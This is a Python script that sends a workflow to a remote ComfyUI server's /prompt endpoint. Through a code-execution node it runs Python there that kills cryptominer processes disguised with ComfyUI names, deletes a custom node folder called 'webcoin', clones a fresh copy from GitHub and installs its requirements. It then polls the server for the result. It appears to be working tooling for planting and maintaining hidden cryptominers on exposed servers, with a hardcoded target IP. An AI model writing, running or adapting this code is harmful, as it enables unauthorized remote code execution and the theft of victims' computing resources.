"""Kill ALL miner processes, nuke dir, fresh clone - single IDENode call."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

full_script = r"""
import os, subprocess, platform, shutil, time, sys

lines = []
is_win = platform.system() == 'Windows'

# 1) Kill ALL miner processes
if is_win:
    for exe in ['comfyui_service.exe', 'comfyui_render.exe', 'xmrig.exe', 'lolMiner.exe']:
        r = subprocess.run(['taskkill', '/F', '/IM', exe], capture_output=True, text=True)
        out = (r.stdout.strip() + ' ' + r.stderr.strip()).strip()
        if out:
            lines.append(f'kill {exe}: {out[:100]}')
else:
    for pat in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolMiner']:
        subprocess.run(['pkill', '-9', '-f', pat], capture_output=True)
    lines.append('pkill sent')

time.sleep(5)

# 2) Find custom_nodes dir
cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

if not cn:
    result = 'ERROR: cannot find custom_nodes'
else:
    target = os.path.join(cn, 'webcoin')
    lines.append(f'target={target}')

    # 3) Nuke directory with multiple attempts
    for attempt in range(3):
        if not os.path.exists(target):
            break
        shutil.rmtree(target, ignore_errors=True)
        time.sleep(1)
        if os.path.exists(target):
            if is_win:
                subprocess.run(f'rmdir /s /q "{target}"', shell=True, capture_output=True)
            else:
                subprocess.run(f'rm -rf "{target}"', shell=True, capture_output=True)
            time.sleep(1)
        lines.append(f'nuke attempt {attempt+1}: exists={os.path.exists(target)}')

    if os.path.exists(target):
        remaining = os.listdir(target)
        lines.append(f'STILL EXISTS: {remaining}')
        for f in remaining:
            fp = os.path.join(target, f)
            try:
                if os.path.isdir(fp):
                    shutil.rmtree(fp, ignore_errors=True)
                else:
                    os.remove(fp)
            except:
                pass
        time.sleep(1)
        shutil.rmtree(target, ignore_errors=True)
        lines.append(f'final exists={os.path.exists(target)}')

    # 4) Clone fresh
    if not os.path.exists(target):
        r = subprocess.run(
            ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
            capture_output=True, text=True, timeout=120
        )
        lines.append(f'clone_rc={r.returncode}')
        if r.stderr.strip():
            lines.append(f'clone_err={r.stderr.strip()[:200]}')
    else:
        lines.append('SKIP CLONE - dir still exists')

    # 5) pip install
    if os.path.isdir(target):
        files = os.listdir(target)
        lines.append(f'files={files[:10]}')
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append(f'pip_rc={r2.returncode}')

        # Remove stale markers
        for marker in ['.initialized', '.orch.pid']:
            mp = os.path.join(target, marker)
            if os.path.exists(mp):
                os.remove(mp)
                lines.append(f'removed {marker}')

    result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": full_script, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

print("Waiting 60s for clone + pip install...")
time.sleep(60)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(f"  {v}")
